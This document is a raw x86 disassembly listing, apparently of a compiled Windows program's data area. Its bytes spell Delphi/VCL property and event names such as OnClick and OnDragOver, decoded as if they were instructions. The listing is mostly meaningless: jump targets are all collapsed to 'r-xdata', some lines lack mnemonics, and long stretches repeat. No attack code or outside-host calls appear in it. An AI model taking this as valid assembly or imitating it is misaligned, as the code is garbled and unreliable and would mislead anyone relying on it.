outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
mov al 0x80
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
dec ebp
outsd
jne r-xdata
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
add [ eax ] al
push edi
inc ecx
add [ eax ] ah
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
inc [ eax + ebx ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
add al 0x18
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jo r-xdata
enter 0x45 0x7c
add [ eax ] al
inc [ ecx + edx * 8 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
inc esp
outsd
arpl [ ebx - 0x4 ] bp
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
inc esp
jb r-xdata
add [ eax ] al
sub [ eax ] 0x0
or cl [ edi + 0x6e ]
add [ eax + 0x4f0a0028 ] al
outsb
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
inc ebp
outsb
inc esp
inc esp
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
add ah bh
fiadd [ ebx ]
jb r-xdata
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push edi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
xor [ ecx ] 0x0
jb r-xdata
sub [ ecx + 0xd80044 ] al
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
outsb
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
and [ edx ] al
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc esp
jb r-xdata
inc ebp
outsb
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
push edi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
adc [ eax ] al
pop ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xea0043de
fiadd [ ebx ]
cmp al 0xdd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] al
add [ eax ] bh
fld [ ebx ]
or [ ebp + 0x63 ] ah
dec esi
outsd
add al 0x85
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
les ecx [ esi ]
add [ eax ] eax
add [ eax ] al
add [ edx ] al
jb r-xdata
arpl [ gs : esi + 0x6f ] cx
dec esp
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
inc esp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
jb r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
mov al [ ecx ]
dec eax
inc esp
jb r-xdata
mov eax eax
rcr ch 0x1
pop [ eax + eax - 0x3c ]
push cs
popad
jae r-xdata
xor eax [ eax ]
call 0x284421e6
xor [ eax ] eax
inc esp
xor [ eax ] eax
or [ edx ] al
in al dx
popad
jae r-xdata
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc ebp
add al cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edx
add al dh
sbb [ eax + eax - 0x4c ] eax
inc eax
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc edx
add [ ebx + ecx + 0xee40042 ] bh
insb
jae r-xdata
inc ebx
rcl al 0xdd
sub_43db39
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
inc esp
push eax
outsd
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0b002b ] al
mov al 0x80
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
jo r-xdata
xor [ ecx ] 0x0
jb r-xdata
sub [ ecx + 0xd80044 ] al
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx - 0x4 ] bp
push ebp
jo r-xdata
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add ah bh
fiadd [ ebx ]
jb r-xdata
inc ebx
add [ ebx ] al
or eax 0x69644554
je r-xdata
push edi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push edi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
and [ edx ] al
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] al
add [ eax ] bh
fld [ ebx ]
or [ ebp + 0x63 ] ah
dec esi
outsd
add al 0x85
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
inc ebp
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xea0043de
fiadd [ ebx ]
cmp al 0xdd
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
les ecx [ esi ]
add [ eax ] eax
add [ eax ] al
add [ edx ] al
jb r-xdata
arpl [ gs : esi + 0x6f ] cx
dec esp
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
inc esp
add [ edx + ecx * 4 - 0xdb7ffbf ] al
jb r-xdata
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
mov al [ ecx ]
dec eax
inc esp
jb r-xdata
mov eax eax
rcr ch 0x1
pop [ eax + eax - 0x3c ]
push cs
popad
jae r-xdata
xor eax [ eax ]
call 0x284421e6
xor [ eax ] eax
inc esp
xor [ eax ] eax
or [ edx ] al
in al dx
popad
jae r-xdata
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc ebp
add al cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edx
add al dh
sbb [ eax + eax - 0x4c ] eax
inc eax
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
inc edx
add [ ebx + ecx + 0xee40042 ] bh
insb
jae r-xdata
inc ebx
rcl al 0xdd
sub_43df26
mov esp 0x100453c
add [ eax + 0x22 ] ah
inc esp
add ah bl
and al [ eax + eax - 0x6c ]
and al [ eax + eax - 0x44 ]
and al [ eax + eax + 0x18 ]
and eax [ eax + eax + 0x50 ]
and eax [ eax + eax - 0x3c ]
and [ eax + eax + 0xb ] eax
push esp
inc ebx
jne r-xdata
fild [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x43
add [ eax ] al
add [ eax ] ah
add al [ eax ]
add [ ebp + ebx * 8 + 0xec40043 ] al
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
inc ebx
je r-xdata
je r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x43 ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x43e0 ] al
add ah ch
xor eax [ eax ]
call 0x284423a2
xor [ eax ] eax
inc esp
xor [ eax ] eax
fdivr st0
inc esp
add [ eax - 0x37ffbabb ] ah
outsd
insd
inc ebp
imul esi [ fs : eax + edx * 8 - 0x23 ] 0x92cc0043
inc esp
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add al dh
sbb [ eax + eax - 0x4c ] eax
inc eax
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
mov al [ 0xffffffffc8004545 ]
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x3cbcff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
sub_43e22f
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
add eax 0x336c7443
inc esp
hlt
sub_43e54b
mov esp 0x100453c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
jb r-xdata
jle r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
add bh bh
sbb [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
add [ ecx + edx * 8 - 0x2e43ffbc ] cl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942e642
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
inc esp
jb r-xdata
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
inc ebx
push 0x65676e61
je r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x74656c62
push edi
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
dec ebx
jns r-xdata
je r-xdata
push edi
jo r-xdata
add [ eax + 0x4f070037 ] al
add [ eax ] al
dec edi
jbe r-xdata
outsb
inc ebp
outsb
inc esp
inc esp
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090039 ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
jb r-xdata
outsb
inc esp
jb r-xdata
add [ eax ] al
xor [ eax + eax ] 0xa
dec edi
add [ eax + 0x4f0a0034 ] al
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
jo r-xdata
loopne r-xdata
jo r-xdata
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
dec ebp
outsd
jne r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or cl [ edi + 0x6e ]
outsb
dec edi
jae r-xdata
jns r-xdata
je r-xdata
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
inc esp
outsd
ja r-xdata
pushad
inc eax
ja r-xdata
dec edi
outsb
push ebx
je r-xdata
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x242e765
xor eax 0x6e4f0900
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
push ebx
jb r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
sub [ ecx + 0xd80044 ] al
add [ eax ] al
add [ eax + 0x61 ] dh
jb r-xdata
jb r-xdata
je r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
pop es
jb r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x43e8acc0 ] cl
inc esp
jb r-xdata
and al 0x44
add [ eax ] bh
inc ecx
add ah al
mov al [ 0x25340041 ]
inc esp
add [ edx ] cl
inc ecx
add [ eax ] bl
xchg ebp eax
inc ecx
add [ edx * 4 - 0x6a9fffbf ] bh
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
call 0x68442ae5
mov eax [ ecx ]
and [ edi - 0x69e7ffbf ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jmp 0x57e96d
dec ecx
je r-xdata
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
outsb
jb r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
inc esp
outsd
int3
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43e950c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jmp r-xdata
jae r-xdata
add ah cl
xchg edx eax
inc esp
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x3f74ffc0 ] ch
lodsb [ esi ]
call 0x114be8f1
push esp
lea eax [ bx + si ]
cmp al 0xe8
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
les ecx [ esi ]
je r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
inc ecx
add [ esp ] ah
inc esp
add [ eax ] bl
xchg esi eax
jb r-xdata
je r-xdata
dec ebp
popad
outsb
je r-xdata
outsb
je r-xdata
add [ ecx + esi + 0x40 ] al
add al ch
xchg esp eax
inc ecx
add [ eax - 0x75 ] ch
inc ecx
add [ eax ] ah
xchg edi eax
inc ecx
jb r-xdata
add [ ecx + ebx * 4 + 0x236c0041 ] ah
inc esp
add [ eax + 0x4004423 ] cl
0x9ea00041 0x41
add [ esp + eax * 2 ] ah
and al 0x44
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
inc esp
add ah al
push cs
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc ecx
add [ esp + 0x44 ] bh
add ah ch
and al 0x44
add [ eax + ebx * 4 - 0x664fffbf ] bh
inc ecx
add [ 0xffffffff9bb80044 ] cl
inc ecx
add [ esp + ebx * 4 + 0x29900041 ] cl
inc eax
add al al
pushfd
inc ecx
add al dh
pushfd
inc ecx
add [ ebp + ebx * 4 + 0x41 ] al
add al dh
popfd
inc ecx
add [ eax - 0x1fffbe61 ] cl
lahf
inc ecx
add [ eax + 0x41 ] dh
add [ esi ] dl
push esp
inc ebx
jne r-xdata
add [ eax - 0x6b ] ah
inc ecx
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax ] al
shr cl 0x1
inc ebx
add [ eax + eax ] dl
add [ eax ] al
jo r-xdata
outsb
je r-xdata
add al 0x8
pop es
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
js r-xdata
je r-xdata
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jmp r-xdata
inc ebx
add al cl
jmp r-xdata
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
pushad
imul ebp [ esi + 0x67 ] 0xe9ec9073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
xor eax [ eax ]
loopne r-xdata
inc eax
add ah ch
outsd
call 0xffffffffec442970
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
inc ecx
add [ ecx + esi - 0x39a3ffbc ] dl
inc esp
add ah bl
push cs
inc edx
inc esp
daa
je r-xdata
sub [ ecx ] dh
insb
add [ 0x65646e49 ] al
js r-xdata
inc esp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
add [ eax + 0x27 ] ah
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
or [ edx ] al
in al dx
je r-xdata
imul ebp [ esi + 0x67 ] 0x43e95073
add [ eax + 0x62 ] bl
inc ecx
add [ eax ] al
add [ eax ] cl
push ebx
je r-xdata
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
inc esp
add [ esi + eax * 8 + 0x44 ] bl
inc ebx
je r-xdata
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ esi + 0x44 ] ch
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
insb
jae r-xdata
add [ ebp - 0x1597ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_43e5d6
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070030 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
